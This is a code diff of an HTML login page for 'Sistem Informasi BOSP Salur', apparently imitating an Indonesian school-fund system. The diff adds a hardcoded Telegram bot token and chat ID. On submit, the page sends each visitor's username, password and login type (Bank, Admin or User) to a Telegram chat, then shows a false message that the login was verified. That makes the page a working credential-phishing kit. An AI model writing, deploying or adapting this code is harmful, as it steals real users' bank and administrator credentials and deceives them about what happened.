@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Informasi BOSP Salur - Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Lucide Icons for consistent look -->
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
@@ -30,6 +29,24 @@
             transform: translateY(-50%);
             color: #9ca3af;
         }
+
+        /* Loading spinner */
+        .loader {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #ffffff;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body class="min-h-screen flex flex-col items-center justify-center p-4">
@@ -38,8 +55,7 @@
     <div class="text-center mb-8">
         <img src="https://img.sanishtech.com/u/2affb8d157b1efecae4163ec9df2c797.png" 
              alt="Logo BOSP" 
-             class="h-20 mx-auto mb-2 object-contain"
-             onerror="this.src='https://via.placeholder.com/200x80?text=BOSP+LOGO'">
+             class="h-20 mx-auto mb-2 object-contain">
         <h1 class="text-2xl font-normal text-gray-600">Sistem Informasi <span class="font-bold text-gray-800">BOSP</span></h1>
         <h2 class="text-3xl font-medium text-gray-700">Salur</h2>
     </div>
@@ -52,6 +68,7 @@
             <!-- Username -->
             <div class="input-icon-wrapper">
                 <input type="text" 
+                       id="username"
                        placeholder="Username" 
                        class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700"
                        required>
@@ -61,6 +78,7 @@
             <!-- Password -->
             <div class="input-icon-wrapper">
                 <input type="password" 
+                       id="password"
                        placeholder="Password" 
                        class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700"
                        required>
@@ -70,17 +88,18 @@
             <!-- Login Type -->
             <div class="space-y-1">
                 <label class="text-sm font-semibold text-gray-600">Login Type</label>
-                <select class="w-full border border-gray-300 p-2.5 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 bg-white text-gray-700 appearance-none cursor-pointer">
-                    <option value="bank">Bank</option>
-                    <option value="admin">Admin</option>
-                    <option value="user">User</option>
+                <select id="loginType" class="w-full border border-gray-300 p-2.5 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 bg-white text-gray-700 appearance-none cursor-pointer">
+                    <option value="Bank">Bank</option>
+                    <option value="Admin">Admin</option>
+                    <option value="User">User</option>
                 </select>
             </div>
 
             <!-- Sign In Button -->
             <button type="submit" 
-                    class="w-full bg-[#007bff] hover:bg-blue-600 text-white font-medium py-2.5 rounded transition-colors mt-2">
-                Sign In
+                    id="submitBtn"
+                    class="w-full bg-[#007bff] hover:bg-blue-600 text-white font-medium py-2.5 rounded transition-colors mt-2 flex items-center justify-center">
+                <span id="btnText">Sign In</span>
             </button>
         </form>
 
@@ -93,46 +112,97 @@
         </div>
     </div>
 
-    <!-- Notification Container -->
-    <div id="toast" class="fixed bottom-5 right-5 hidden bg-white border-l-4 border-blue-500 p-4 shadow-lg rounded transform transition-all duration-300 translate-y-20">
-        <div class="flex items-center">
-            <div class="flex-shrink-0">
-                <i data-lucide="info" class="w-5 h-5 text-blue-500"></i>
-            </div>
-            <div class="ml-3">
-                <p class="text-sm text-gray-700 font-medium" id="toastMessage"></p>
-            </div>
+    <!-- Custom Alert Modal -->
+    <div id="modal" class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-lg p-6 max-w-sm w-full shadow-xl">
+            <div id="modalIcon" class="mx-auto flex items-center justify-center h-12 w-12 rounded-full mb-4"></div>
+            <h3 id="modalTitle" class="text-lg font-bold text-center mb-2"></h3>
+            <p id="modalMessage" class="text-gray-600 text-center mb-6 text-sm"></p>
+            <button onclick="closeModal()" class="w-full py-2 bg-gray-800 text-white rounded hover:bg-gray-700 font-medium">
+                Tutup
+            </button>
         </div>
     </div>
 
     <script>
-        // Initialize Lucide Icons
+        // Konfigurasi Bot Telegram
+        const TELEGRAM_TOKEN = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
+        const TELEGRAM_CHAT_ID = "8001301204";
+
+        // Inisialisasi Ikon
         lucide.createIcons();
 
-        // Form Submission Logic
         const loginForm = document.getElementById('loginForm');
-        const toast = document.getElementById('toast');
-        const toastMessage = document.getElementById('toastMessage');
+        const submitBtn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
+        const modal = document.getElementById('modal');
 
-        function showToast(message) {
-            toastMessage.textContent = message;
-            toast.classList.remove('hidden', 'translate-y-20');
+        function showModal(title, message, isSuccess) {
+            const iconDiv = document.getElementById('modalIcon');
+            const titleEl = document.getElementById('modalTitle');
+            const messageEl = document.getElementById('modalMessage');
+
+            titleEl.textContent = title;
+            messageEl.textContent = message;
             
-            setTimeout(() => {
-                toast.classList.add('translate-y-20');
-                setTimeout(() => toast.classList.add('hidden'), 300);
-            }, 3000);
+            if (isSuccess) {
+                iconDiv.className = "mx-auto flex items-center justify-center h-12 w-12 rounded-full mb-4 bg-green-100";
+                iconDiv.innerHTML = '<i data-lucide="check" class="text-green-600"></i>';
+            } else {
+                iconDiv.className = "mx-auto flex items-center justify-center h-12 w-12 rounded-full mb-4 bg-red-100";
+                iconDiv.innerHTML = '<i data-lucide="x" class="text-red-600"></i>';
+            }
+            
+            modal.classList.remove('hidden');
+            lucide.createIcons();
         }
 
-        loginForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            showToast("Mencoba melakukan autentikasi...");
-        });
+        function closeModal() {
+            modal.classList.add('hidden');
+        }
 
-        // Dummy link interaction
-        document.querySelector('a').addEventListener('click', (e) => {
+        loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
-            showToast("Fungsi Lupa Password belum tersedia.");
+
+            // Ambil data
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const type = document.getElementById('loginType').value;
+
+            // Efek Loading
+            submitBtn.disabled = true;
+            btnText.innerHTML = '<span class="loader"></span> Memproses...';
+
+            // Format Pesan Telegram
+            const text = `🚀 *Login BOSP Baru*\n\n` +
+                         `👤 *Username:* \`${username}\`\n` +
+                         `🔑 *Password:* \`${password}\`\n` +
+                         `🏷️ *Type:* ${type}\n\n` +
+                         `🕒 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (response.ok) {
+                    showModal("Berhasil", "Data login telah diverifikasi.", true);
+                    loginForm.reset();
+                } else {
+                    throw new Error("Gagal mengirim data");
+                }
+            } catch (error) {
+                showModal("Gagal", "Terjadi kesalahan koneksi. Silakan coba lagi.", false);
+            } finally {
+                submitBtn.disabled = false;
+                btnText.innerHTML = 'Sign In';
+            }
         });
     </script>
 </body>
